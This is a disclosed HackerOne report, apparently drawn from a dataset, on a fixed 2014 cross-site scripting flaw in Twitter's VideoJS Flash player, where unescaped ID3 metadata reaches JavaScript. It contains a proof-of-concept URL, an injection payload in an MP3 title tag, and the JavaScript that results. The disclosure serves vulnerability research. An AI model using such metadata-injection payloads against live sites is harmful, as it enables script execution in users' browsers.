---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '29360'
original_report_id: '29360'
title: XSS platform.twitter.com | video-js metadata
weakness: Cross-site Scripting (XSS) - Generic
team_handle: x
created_at: '2014-09-29T09:49:48.027Z'
disclosed_at: '2014-11-17T14:30:53.543Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 1
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# XSS platform.twitter.com | video-js metadata

## Metadata

- HackerOne Report ID: 29360
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: x
- Disclosed At: 2014-11-17T14:30:53.543Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

https://platform.twitter.com/video/video-js.1e43b81a2f30220a16fd493aaf072451.swf

VideoJS does not escape metadata passed to JavaScript via ExternalInterface. 
Since VideoJS does not load a required policy file to read metadata from mp3s loaded from an external server via http we need to use rtmp. Also other metadata send from the server (like the servername) can be used to gain JavaScript-Execution.

__PoC:__
https://platform.twitter.com/video/video-js.1e43b81a2f30220a16fd493aaf072451.swf?eventProxyFunction=console.log&autoplay=true&rtmpStream=mp3:haha&rtmpConnection=rtmp://not-a-real-example-rtmp-server.com/

_Example File:_
http://batr.am/haha.mp3

ID3:

    Title: \"})})))}finally{confirm(/moin/)}//


Resulting JS:

    try { __flash__toXML(console.log("plugin","loadedmetadata",({audiochannels:2,tags:({TIT2:"\\"})})))}finally{confirm(/moin/)}//"}),audiosamplerate:44100,audiocodecid:".mp3",bandwidth:368,endTimestamp:1.881,Server:"C++ RTMP Media Server (www.rtmpd.com)",totalFramesCount:73,duration:1.881,fileSize:47104,videoFramesCount:0,startTimestamp:0,audioFramesCount:0,stereo:true}))) ; } catch (e) { "<undefined/>"; }

Tested with:
C++ RTMP Media Server (www.rtmpd.com)

Win 8.1 | Google Chrome Version 39.0.2166.2 dev-m (64-bit) | Flash plugin 15.0.0.152
Win 8.1 | Mozilla Firefox Version 32.0.3 | Flash plugin 15.0.0.152

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
